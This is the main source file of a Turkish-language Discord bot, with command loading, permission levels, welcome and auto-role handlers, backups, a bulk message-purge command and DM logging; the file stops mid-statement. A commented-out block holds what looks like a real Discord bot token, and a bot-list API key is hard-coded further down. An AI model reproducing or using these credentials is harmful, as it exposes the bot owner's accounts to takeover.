const http = require("http");
const express = require("express"); `Tm`
const app = express();
app.get("/", (request, response) => {
  console.log("Botu açık tutmak için yeniden bağlandım!");
  response.sendStatus(200);
});
setInterval(() => {
  http.get(`http://mashirobotdc.glitch.me/`); //Buraya glitch linkinizi doğru şekilde giriniz. ve Botunuz 7/24 olacaktır!
}, 280000);//Maga Be
const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const chalk = require("chalk");
const moment = require("moment");
var Jimp = require("jimp");
const fs = require("fs");
require("./util/eventLoader")(client);
const path = require("path");
const db = require("quick.db");
client.queue = new Map();
global.queue = new Map();

require("./ek/object");
var prefix = ayarlar.prefix;

const log = message => {
  console.log(`Mashiro: ${message}`);
};

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir("./komutlar/", (err, files) => {
  if (err) console.error(err);
  log(`${files.length} komut yüklenecek.`);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    log(`Yüklenen komut: ${props.help.name}.`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
});

client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.elevation = message => {
  if (!message.guild) {
    return;
  }
  const gold = require("./gold.json")
  let permlvl = 0;
  if (message.member.hasPermission("MANAGE_GUILD")) permlvl = 1;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.member.id === ayarlar.sahip) permlvl = 4;
  if (message.member.id === gold.gold1) permlvl = 5;
  if (message.member.id === gold.gold2) permlvl = 5;
  if (message.member.id === gold.gold3) permlvl = 5;
  if (message.member.id === gold.gold4) permlvl = 5;
  if (message.guild.id === gold.gsunucu) permlvl = 6;
  return permlvl;
};

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
// client.on('debug', e => {
//   console.log(chalk.bgBlue.green(e.replace(regToken, 'that was redacted')));
// });

client.on("warn", e => {
  console.log(chalk.bgYellow(e.replace(regToken, "that was redacted")));
});

client.on("error", e => {
  console.log(chalk.bgRed(e.replace(regToken, "that was redacted")));
});

client.ayar = db;
client.config = require("./config.js");
require("./modules/functions.js")(client);

client.ayarlar = {
  sahip: ["662380951053139988"] //kendi IDn�z� yaz�n�z
};

client.on("ready", async () => {
  client.appInfo = await client.fetchApplication();
  setInterval(async () => {
    client.appInfo = await client.fetchApplication();
  }, 60000);
});

client.on("message", msg => {
  if (msg.content.toLowerCase() === "kaç kişi var?") {
    const say = new Discord.RichEmbed()
      .setThumbnail(msg.guild.iconURL)
      .setColor("0x36393E")
      .addField(
        `» Say Komutu!`,
        `» Şuanda bu sunucuda ${msg.guild.memberCount} kullanıcı bulunuyor. `,
        true
      )
      .addField(
        `» Teşekkürler!`,
        `» Botumu kullandığın için teşekkür ederim.`,
        true
      );
    return msg.channel.send(say);
  }
});

client.on("message", m => {
  var { RichEmbed } = require("discord.js");
  var Komut = m.content.split(" ")[0].slice(prefix.length);
  var Kullanıcı = m.mentions.users.first() || m.author;

  var kullanıcıBilgisi = {};
  kullanıcıBilgisi.botDenetlemesi = Kullanıcı.bot
    .toString()
    .replace("true", "botun")
    .replace("false", "kullanıcının");

  if (Komut == "dynoavatar") {
    if (!m.mentions.users.first()) Kullanıcı = m.author;
    if (m.mentions.users.first()) Kullanıcı = m.mentions.users.first();

    m.channel.send(
      new RichEmbed()
        .setColor(0x36393e)
        .setImage(
          `https://color.dyno.gg/dynoav?url=${Kullanıcı.avatarURL}?size=256?r=1.1`
        )
    );
  }
});

client.ekoayarlar = {
  parabirimi: "VCS",
  botunuzunprefixi: "!!",
  botunuzunidsi: "670232470414688256",
  botismi: "Mashiro",
  renk: "0x36393E", //İNGİLİZCE TERCİH ETTİĞİNİZ RENGİ YAZINIZ! EĞER BÖYLE BIRAKIRSANIZ RASTGELE ATAR!
  isimsiz: "Anonymous", //İSİMSİZ KİŞİLERİN HANGİ İSİM İLE GÖZÜKECEĞİNİ BELİRLEYEBİLİRSİNİZ!
  rastgelepara: true, //EĞER BUNU TRUE YAPARSANIZ RASTGELE PARA VERME ÖZELLİĞİ AKTİF OLUR VE GÜNLÜK PARALARI RASTGELE VERİR!
  minpara: 10, //EĞER RASTGELE PARA DURUMUNU AKTİF ETTİYSENİZ BURADAN RASTGELE PARA PARAMETRESİNİNİN MİNUMUM PARASINI BELİRTİNİZ!
  maxpara: 200, //EĞER RASTGELE PARA DURUMUNU AKTİF ETTİYSENİZ BURADAN RASTGELE PARA PARAMETRESİNİNİN MAXİMUM PARASINI BELİRTİNİZ!
  günlükpara: 50, //EĞER RASTGELE PARAYI TRUE YAPTIYSANIZ BURAYI ELLEMENİZE GEREK YOK!
  dbloy: false, //EĞER BOTUNUZ DBL (DİSCORD BOT LİST) DE KAYITLIYSA GÜNLÜK ÖDÜL ALMAK İÇİN OY İSTER FALSE KAPALI, TRUE AKTİF DEMEK!
  dblkey: "KEY", //EĞER DBLOY U AKTİF ETMEDİYSENİZ BURAYA KEY EKLEMENİZE GEREK YOK EĞER AKTİF ETTİYSENİZ DBL SİTESİNDEN BULABİLİRSİNİZ!
  başlangıçparası: 50, //EĞER RASTGELE PARAYI TRUE YAPTIYSANIZ BURAYI ELLEMENİZE GEREK YOK!
  admin: ["", ""]
};

client.on("message", async message => {
  let sayac = JSON.parse(fs.readFileSync("./ayarlar/sayac.json", "utf8"));
  if (sayac[message.guild.id]) {
    if (sayac[message.guild.id].sayi <= message.guild.members.size) {
      const embed = new Discord.RichEmbed()
        .setDescription(
          `Tebrikler, başarılı bir şekilde ${sayac[message.guild.id].sayi} kullanıcıya ulaştık!`
        )
        .setColor("0x808080")
        .setTimestamp();
      message.channel.send({ embed });
      delete sayac[message.guild.id].sayi;
      delete sayac[message.guild.id];
      fs.writeFile("./ayarlar/sayac.json", JSON.stringify(sayac), err => {
        console.log(err);
      });
    }
  }
});
client.on("guildMemberRemove", async member => {
  let sayac = JSON.parse(fs.readFileSync("./ayarlar/sayac.json", "utf8"));
  let giriscikis = JSON.parse(fs.readFileSync("./ayarlar/sayac.json", "utf8"));
  let embed = new Discord.RichEmbed()
    .setTitle("")
    .setDescription(``)
    .setColor("RED")
    .setFooter("", client.user.avatarURL);

  if (!giriscikis[member.guild.id].kanal) {
    return;
  }

  try {
    let giriscikiskanalID = giriscikis[member.guild.id].kanal;
    let giriscikiskanali = client.guilds
      .get(member.guild.id)
      .channels.get(giriscikiskanalID);
    giriscikiskanali.send(
      `:loudspeaker: ${member.user.tag}, aramızdan ayrıldı, \**${
        sayac[member.guild.id].sayi
      }\** kişi olmamıza \**${sayac[member.guild.id].sayi -
        member.guild.memberCount}\** kişi kaldı!`
    );
  } catch (e) {
    // eğer hata olursa bu hatayı öğrenmek için hatayı konsola gönderelim.
    return console.log(e);
  }
});
client.on("guildMemberAdd", async member => {
  let sayac = JSON.parse(fs.readFileSync("./ayarlar/sayac.json", "utf8"));
  let giriscikis = JSON.parse(fs.readFileSync("./ayarlar/sayac.json", "utf8"));
  let embed = new Discord.RichEmbed()
    .setTitle("")
    .setDescription(``)
    .setColor("GREEN")
    .setFooter("", client.user.avatarURL);

  if (!giriscikis[member.guild.id].kanal) {
    return;
  }

  try {
    let giriscikiskanalID = giriscikis[member.guild.id].kanal;
    let giriscikiskanali = client.guilds
      .get(member.guild.id)
      .channels.get(giriscikiskanalID);
    giriscikiskanali.send(
      `:loudspeaker: ${member.user.tag}, aramıza katıldı **${
        sayac[member.guild.id].sayi
      }** kişi olmamıza **${sayac[member.guild.id].sayi -
        member.guild.memberCount}** kişi kaldı!`
    );
  } catch (e) {
    // eğer hata olursa bu hatayı öğrenmek için hatayı konsola gönderelim.
    return console.log(e);
  }
});

client.on("guildMemberAdd", async member => {
  db.fetch(`hgsistemi_${member.guild.id}`).then(x => {
    if (x == `acik`) {
      db.fetch(`dmmesaj_${member.guild.id}`).then(ozelhosgeldin => {
        if (!ozelhosgeldin) return;
        member.send(
          ozelhosgeldin
            ? ozelhosgeldin
                .replace("-sunucu-", `${member.guild.name}`)
                .replace("-kullanıcı-", `${member.user.tag}`)
                .replace("-sayı-", `${member.guild.members.size}`)
                .replace("-id-", `${member.user.id}`)
            : ``
        );
      });
    } else if (x == `kapali`) {
    }
  });
});

client.on("guildMemberRemove", async member => {
  db.fetch(`hgsistemi_${member.guild.id}`).then(x => {
    if (x == `acik`) {
      db.fetch(`dmbbmesaj_${member.guild.id}`).then(ozelgorusuruz => {
        if (!ozelgorusuruz) return;
        member.send(
          ozelgorusuruz
            ? ozelgorusuruz
                .replace("-sunucu-", `${member.guild.name}`)
                .replace("-kullanıcı-", `${member.user.tag}`)
                .replace("-sayı", `${member.guild.members.size}`)
                .replace("-id-", `${member.user.id}`)
            : ``
        );
      });
    } else if (x == `kapali`) {
    }
  });
});

///////////////////////////////////////-------> Otorol <-------////////////////////////////////////////

client.on("guildMemberAdd", async (member, guild, message) => {
  //CodAre
  let role = await db.fetch(`otorolisim_${member.guild.id}`);
  let otorol = await db.fetch(`autoRole_${member.guild.id}`);
  let i = await db.fetch(`otorolKanal_${member.guild.id}`);
  if (!otorol || otorol.toLowerCase() === "yok") return;
  else {
    try {
      //CodAre

      if (!i) return; //CodAre

      member.addRole(member.guild.roles.get(otorol));
      var embed = new Discord.RichEmbed()
        .setDescription(
          `\`${member.user.tag}\` adlı kullanıcı aramıza katıldı \`${role}\` adlı rol başarıyla verildi`
        )
        .setColor("0x36393E") //CodAre
        .setFooter(`Mashiro Otorol Sistemi`);
      member.guild.channels.get(i).send(embed);
    } catch (e) {
      console.log(e);
    }
  }
});

//CodAre

///////////////////////////////////////-------> HG-BB ayarlamalı <-------/////////////////////////////////////

client.on("message", async msg => {
  let ozelkomut = await db.fetch(`sunucuKomut_${msg.guild.id}`);
  let ozelkomutYazi;
  if (ozelkomut == null) ozelkomutYazi = "Burayı silme yoksa hatalı olur";
  else ozelkomutYazi = "" + ozelkomut + "";
  if (msg.content.toLowerCase() === `${ozelkomutYazi}`) {
    let mesaj = await db.fetch(`sunucuMesaj_${msg.guild.id}`);
    let mesajYazi;
    if (mesaj == null) mesajYazi = "Burayı silme yoksa hatalı olur";
    else mesajYazi = "" + mesaj + "";
    msg.channel.send(mesajYazi);
  }
});

///////////////////////////////////////-------> Özel Komut <-------////////////////////////////////////////

client.on("message", msg => {
  if (msg.content.toLowerCase() === "!!sil") {
    if (msg.channel.type === "dm") {
      const ozelmesajuyari = new Discord.RichEmbed()
        .setColor(0xdcff00)
        .setTimestamp()
        .setAuthor(msg.author.username, msg.author.avatarURL)
        .addField(":x:**UYARI**:x:", "Bu komutu özel mesajlarda kullanamazsın.")
        .setFooter(`© Mythia Bot Tüm hakları saklıdır.`);
      msg.author.sendEmbed(ozelmesajuyari);
    }
    if (msg.channel.type !== "dm") {
      if (!msg.member.hasPermission("MANAGE_MESSAGES")) {
        if (msg.author.id !== ayarlar.sahip) {
          const mesajlariyonet = new Discord.RichEmbed()
            .setColor(0xff0000)
            .setTimestamp()
            .setAuthor(msg.author.username, msg.author.avatarURL)
            .addField(
              ":x:**UYARI**:x:",
              "Bu komutu kulllanmak için `Mesajları Yönet` iznine sahip olmalısın."
            );
          return msg.author.sendEmbed(mesajlariyonet);
        }
      }
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      msg.channel.bulkDelete(100);
      const sohbetsilindi = new Discord.RichEmbed()
        .setColor(0x35ff00)
        .setTimestamp()
        .addField("Eylem:", "**Sohbet silme**")
        .addField("Yetkili:", "` " + msg.author.username + "`")
        .addField("Silinen Mesaj Sayısı:", "»" + "  **10000**  " + "«")
        .addField("Sonuç:", "`Başarılı`" + " :white_check_mark:  ")
       .setFooter(` © Mashiro Tüm hakları saklıdır.`)
      return msg.channel.sendEmbed(sohbetsilindi).then(msg => msg.delete(3000));
    }
  }
});

// Load modules
const backup = require("discord-backup"),
  settings = {
    prefix: "!!"
  };

client.on("message", async message => {
  // This reads the first part of your message behind your prefix to see which command you want to use.
  let command = message.content
    .toLowerCase()
    .slice(settings.prefix.length)
    .split("")[0];

  // These are the arguments behind the commands.
  let args = message.content.split(" ").slice(1);

  // If the message does not start with your prefix return.
  // If the user that types a message is a bot account return.
  // If the command comes from DM return.
  if (
    !message.content.startsWith(ayarlar.prefix) ||
    message.author.bot ||
    !message.guild
  )
    return;

  if (command === "yedekle") {
    // Check member permissions
    if (!message.member.hasPermission("ADMINISTRATOR")) {
      return message.channel.send(
        ":x: | You must be an administrator of this server to request a backup!"
      );
    }
    // Create the backup
    backup.create(message.guild).then(backupID => {
      // And send informations to the backup owner
      message.author.send(
        "The backup has been created! To load it, type this command on the server of your choice: `" +
          ayarlar.prefix +
          "load " +
          backupID +
          "`!"
      );
    });
  }

  if (command === "yükle") {
    // Check member permissions
    if (!message.member.hasPermission("ADMINISTRATOR")) {
      return message.channel.send(
        ":x: | You must be an administrator of this server to load a backup!"
      );
    }
    let backupID = args[0];
    if (!backupID) {
      return message.channel.send(":x: | You must specify a valid backup ID!");
    }
    // Fetching the backup to know if it exists
    backup
      .fetch(backupID)
      .then(async () => {
        // If the backup exists, request for confirmation
        message.channel.send(
          ":warning: | When the backup is loaded, all the channels, roles, etc. will be replaced! Type `-confirm` to confirm!"
        );
        await message.channel
          .awaitMessages(
            m => m.author.id === message.author.id && m.content === "-confirm",
            {
              max: 1,
              time: 20000,
              errors: ["time"]
            }
          )
          .catch(err => {
            // if the author of the commands does not confirm the backup loading
            return message.channel.send(
              ":x: | Time's up! Cancelled backup loading!"
            );
          });
        // When the author of the command has confirmed that he wants to load the backup on his server
        message.author.send(":white_check_mark: | Start loading the backup!");
        // Load the backup
        backup
          .load(backupID, message.guild)
          .then(() => {
            // When the backup is loaded, delete them from the server
            backup.delete(backupID);
          })
          .catch(err => {
            // If an error occurenced
            return message.author.send(
              ":x: | Sorry, an error occurenced... Please check that I have administrator permissions!"
            );
          });
      })
      .catch(err => {
        // if the backup wasn't found
        return message.channel.send(
          ":x: | No backup found for `" + backupID + "`!"
        );
      });
  }

  if (command === "yedekleme-bilgi") {
    let backupID = args[0];
    if (!backupID) {
      return message.channel.send(":x: | You must specify a valid backup ID!");
    }
    // Fetch the backup
    backup
      .fetch(backupID)
      .then(backupInfos => {
        let embed = new Discord.MessageEmbed()
          .setAuthor("Backup Informations")
          // Display the backup ID
          .addField("ID", backupInfos.ID, true)
          // Displays the server from which this backup comes
          .addField("Server", backupInfos.server, true)
          // Display the size (in mb) of the backup
          .addField("Size", backupInfos.size, true)
          // Display when the backup was created
          .addField(
            "Created at",
            timeConverter(backupInfos.createdTimestamp),
            true
          )
          .setColor("#FF0000");
        message.channel.send(embed);
      })
      .catch(err => {
        // if the backup wasn't found
        return message.channel.send(
          ":x: | No backup found for `" + backupID + "`!"
        );
      });
  }
});

function timeConverter(t) {
  var a = new Date(t);
  var today = new Date();
  var yesterday = new Date(Date.now() - 86400000);
  var months = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec"
  ];
  var year = a.getFullYear();
  var month = months[a.getMonth()];
  var date = a.getDate();
  var hour = a.getHours();
  var min = a.getMinutes();
  if (a.setHours(0, 0, 0, 0) == today.setHours(0, 0, 0, 0))
    return "today, " + hour + ":" + min;
  else if (a.setHours(0, 0, 0, 0) == yesterday.setHours(0, 0, 0, 0))
    return "yesterday, " + hour + ":" + min;
  else if (year == today.getFullYear())
    return date + " " + month + ", " + hour + ":" + min;
  else return date + " " + month + " " + year + ", " + hour + ":" + min;
}

const TR = require("trlistapi.js");

const trlist = new TR("EHZ1EDOJhINouQEjiE3W0lWnu_7LPq2j", client);

trlist.on("yolla", () => {
  console.log("[WP List] Sunucu Sayısı Gönderildi!");
});

trlist.on("hata", hata => {
  console.log(`[M List] Bir Hata Oluştu. Hata: ${hata}`);
});

client.on("message", async (msg, member, guild) => {
  let i = await db.fetch(`saas_${msg.guild.id}`);
  if (i === "açık") {
    if (msg.content.toLowerCase() === "sa") {
      msg.reply("Aleyküm Selam Hoşgeldin Nasılsın");
    }
  }
});

client.on("message", async msg => {
  if (msg.channel.type === "dm") return;
  if (msg.author.bot) return;

  if (msg.content.length > 7) {
    db.add(`puan_${msg.author.id + msg.guild.id}`, 3);
  }

  if (db.fetch(`puan_${msg.author.id + msg.guild.id}`) > 150) {
    db.add(`seviye_${msg.author.id + msg.guild.id}`, 1);

    db.delete(`puan_${msg.author.id + msg.guild.id}`);
  }
});

client.on("message", async msg => {
const request = require('node-superfetch');
const db = require('quick.db');
const ms = require('parse-ms')
let timeout = 2000//süresini dilediğiniz gibi kısaltabilirsiniz.
let kullanıcı = await db.fetch(`gold_${msg.author.id}`);
let vkullanıcı = 'gold'
if (msg.author.id == vkullanıcı) {
if (kullanıcı !== undefined && timeout - (Date.now() - kullanıcı) > 0) {
let time = ms(timeout - (Date.now() - kullanıcı));
} else {
if(msg.author.bot) return; 
if (msg.content.length > 1) {
db.set(`gold_${msg.author.id}`, Date.now());
var embed = new Discord.RichEmbed()
.setTitle(`<a:shardr:666980258121121802> Bu Bir Gold Uye <a:shardr:666980258121121802> `)
.addField(`<a:shardr:666980258121121802> Gold Uyeme Benden Cay <a:shardr:666980258121121802> `, `[Gold Al](https://discord.gg/knEkSEv)`,true)
.setDescription(`:white_check_mark:Yat Assa Bu Gold Uye \n<@${msg.author.id}>`)
.setThumbnail(msg.author.avatarURL)
.setColor('GOLD')

msg.channel.send(embed).then(msg => msg.delete(5600));
}
};
}
else if (vkullanıcı == undefined) { 
}
if (!vkullanıcı) return;

});
client.login(ayarlar.token);

var categoryID = "";
var voiceID = "";

client.on("voiceStateUpdate", (Old, New) => {
  if (New.user.bot) return;
  if (Old.user.bot) return;
  if (New.voiceChannelID == voiceID) {
    New.guild.createChannel(New.user.tag, "voice").then(set => {
      New.setVoiceChannel(New.guild.channels.get(set.id)).then(() => {
        set.setParent(New.guild.channels.get(categoryID));
      });
      set.overwritePermissions(New.user, {
        CONNECT: true,
        SPEAK: true,
        MOVE_MEMBERS: true,
        VIEW_CHANNEL: true,
        MANAGE_CHANNELS: true,
        MANAGE_ROLES_OR_PERMISSIONS: true,
        USE_VAD: true,
        PRIORITY_SPEAKER: true
      });
    });
  }
  if (Old.voiceChannel) {
    Old.guild.channels.forEach(channels => {
      if (channels.parentID == categoryID) {
        if (channels.id == voiceID) return;
        if (Old.voiceChannelID == channels.id) {
          if (Old.voiceChannel.members.size == 0) {
            channels.delete();
          }
        }
      }
    });
  }
});
///client.on("message", msg => {
 // if (msg.content.toLowerCase() === "+js") {
   // // İstediğiniz Komut
 ///   msg.member.addRole("670539482667286532"); //Rolü bir yerde bahsedin sonra sağ tıklayıp İD'sini alın
   /// msg.reply(
///      "\n<@&670539482667286532> ***Rolünü Başarıyla Aldın.***\n***Kodlarin Tadini Cikar*** "
  //  ); //Komutu Yazınca cevap ne yazsın?
 /// }
//});
client.on("message", message => {
  if (message.channel.type === "dm") {
    if (message.author.bot) return;
    const dmlog = new Discord.RichEmbed()
      .setTitle(`${client.user.username}'a Özelden Mesaj Gönderildi!`)
      .setColor("RANDOM")
      .addField("Mesajı Gönderen", ` \`\`\` ${message.author.tag} \`\`\` `)
      .addField("Mesajı Gönderenin ID", ` \`\`\`${message.author.id}\`\`\` `)
      .addField(`Gönderilen Mesaj`, message.content)
      .setThumbnail(message.author.avatarURL);
    client.channels.get("675042081080868923").send(dmlog);
  }
});
//const Discord = require("")
/*const scarew = new Discord.ShardingManager("./server.js", {
totalShards: 'auto',
token: 'NjcwMjMyNDcwNDE0Njg4MjU2.XixmlQ.aBe9lfgj7fUvIwnfR11IFX0HgDM'
},
  scarew.on('launch', shard => {
client.on('message', msg => {
  if (msg.content.toLowerCase() === 'shard') {  // İstediğiniz Komut
      // msg.member.addRole("rol idi") //Rolü bir yerde bahsedin sonra sağ tıklayıp İD'sini alın
    msg.reply(`Shard: ${shard.id}`); //Komutu Yazınca cevap ne yazsın?
  }
})}))*/
/*client.on("message", message => {
  
    let afk_kullanici = message.mentions.users.first() || message.author;
    if(message.content.startsWith(ayarlar.prefix+"afk")) return; //
  if (message.author.bot === true) return;
   

    //let afk_kullanici = message.mentions.users.first() || message.author;
   //var p = denetim[member.guild.id] ? denetim[member.guild.id].prefix : "*"
   //if (!denetim[member.guild.id]) return;
  //  if(message.content.startsWith(p+"afk")) return; //! yazan yeri kendi botunuzun prefixi ile değiştirin.
  //if (message.author.bot === true) return;
     if(message.content.includes(`<@${afk_kullanici.id}>`))
         if(db.has(`afks_${afk_kullanici.id}`)) {
             const afksuan = new Discord.RichEmbed()
                     .setColor("RANDOM")
                     .setDescription(`**${client.users.get(afk_kullanici.id).tag}** adlı kullanıcı şuanda AFK! \n**Sebep:** \n${db.fetch(`afks_${afk_kullanici.id}`)}`)
                     message.channel.send(afksuan)
                 //message.channel.send(`**${bot.users.get(afk_kullanici.id).tag}** adlı kullanıcı şuanda AFK! \n**Sebep:** \n${db.fetch(`afks_${afk_kullanici.id}`)}`)
         }
   
         if(db.has(`afks_${message.author.id}`)) {
             const basarili = new Discord.RichEmbed()
                 .setColor("RANDOM")
                 .setDescription("<@"+`${message.author.id}`+">"+"Başarıyla AFK modundan çıktın")
                 //message.reply("başarıyla AFK modundan çıktın!")
                message.channel.send(basarili)
             db.delete(`afks_${message.author.id}`)
         } 

       });*/
/*const antispam = require("discord-anti-spam-tr");  
antispam(client, { 
uyarmaSınırı: 4, //Uyarılmadan önce aralıkta gönderilmesine izin verilen maksimum mesaj miktarı. 
banlamaSınırı: 7,  //Yasaklanmadan önce aralıkta gönderilm,  // ms kullanıcılarda zaman miktarı, yasaklanmadan önce aralık değişkeninin maksimumunu gönderebilir. 
uyarmaMesajı: "Spamı Durdur Yoksa Mutelerim.",  // Uyarı mesajı, kullanıcıya hızlı gideceklerini belirten kullanıcıya gönderilir.. 
rolMesajı: "Spam için yasaklandı, başka biri var mı?",  //Yasak mesajı kullanıcıyı Banlar 
maxSpamUyarı: 8, //Bir kullanıcının uyarılmadan önce bir zaman dilimi içinde gönderebileceği maksimum kopya sayısı 
maxSpamBan: 12,  //Bir kullanıcının yasaklanmadan önce bir zaman diliminde gönderebildiği maksimum kopya sayısı 
zaman: 7,  // Spamdan sonraki zaman 
rolİsimi: "Spammer" // Spam Atan Kullanıcılar Verilecek Rol 
});*/
client.on("message", async msg => {
  const request = require("node-superfetch");
  const db = require("quick.db");
  const ms = require("parse-ms");
  let timeout = 120000; //süresini dilediğiniz gibi kısaltabilirsiniz.
  let dakdest = await db.fetch(`goldzzz_${msg.author.id}`);
  let i = ayarlar.sahip;
  if (msg.author.id == i) {
    if (dakdest !== null && timeout - (Date.now() - dakdest) > 0) {
      let time = ms(timeout - (Date.now() - dakdest));
    } else {
      if (msg.author.bot) return;
      if (msg.content.length > 1) {
        db.set(`goldzzz_${msg.author.id}`, Date.now());
        var embed = new Discord.RichEmbed()
          .setDescription(
            `:white_check_mark: İşte benim **sahibim Burada Aç Yolu**! \n<@${msg.author.id}> Hoşgeldin Canımın Içi`
          )
              .setThumbnail(msg.author.avatarURL)
          .setColor("BLUE");
        msg.channel.send(embed).then(msg => msg.delete(5600));
      }
    }
  } else if (i == undefined) {
  }
  if (!i) return;
});
/*const gold = require("./gold.json");
client.on("message", async msg => {
  const request = require("node-superfetch");
  const db = require("quick.db");
  const ms = require("parse-ms");
  let timeout = 120000; //süresini dilediğiniz gibi kısaltabilirsiniz.
  let dakdest = await db.fetch(`goldzzz_${msg.author.id}`);
  let i = gold.gold1;
  if (msg.author.id == i) {
    if (dakdest !== null && timeout - (Date.now() - dakdest) > 0) {
      let time = ms(timeout - (Date.now() - dakdest));
    } else {
      if (msg.author.bot) return;
      if (msg.content.length > 1) {
        db.set(`goldzzz_${msg.author.id}`, Date.now());
        var embed = new Discord.RichEmbed()
          .setTitle(
            `<a:shardr:666980258121121802> Bu Bir Premium Uye <a:shardr:666980258121121802> `
          )
          .addField(
            `<a:shardr:666980258121121802> Premium Uyeme Benden Cay <a:shardr:666980258121121802> `,
            `[Premium Al](https://discord.gg/knEkSEv)`,
            true
          )
          .setDescription(
            `:white_check_mark:Yat Assa Bu Cocuk Premium Uye \n<@${msg.author.id}>`
          )
              .setThumbnail(msg.author.avatarURL)
          .setColor("GOLD");
        msg.channel.send(embed).then(msg => msg.delete(5600));
      }
    }
  } else if (i == undefined) {
  }
  if (!i) return;
});*/
client.on("message", async msg => {
  if (msg.content.toLowerCase() === "sa") {
    await msg.react("");
    msg.react("");
  }
});

client.on("message", async msg => {
  if (msg.content.toLowerCase() === "selam") {
    await msg.react("");
    msg.react("");
  }
});

client.on("message", async msg => {
  if (msg.content.toLowerCase() === "selamın aleyküm") {
    await msg.react("");
    msg.react("");
  }
});

client.on("message", async msg => {
  if (msg.content.toLowerCase() === "selamun aleyküm") {
    await msg.react("");
    msg.react("");
  }
});
/////////////otorol

client.on("guildMemberAdd", async member => {
  let sayac = JSON.parse(fs.readFileSync("./otorol.json", "utf8"));
  let otorole = JSON.parse(fs.readFileSync("./otorol.json", "utf8"));
  let arole = otorole[member.guild.id].sayi;
  let giriscikis = JSON.parse(fs.readFileSync("./otorol.json", "utf8"));
  let embed = new Discord.RichEmbed()
    .setTitle("Otorol Sistemi")
    .setDescription(
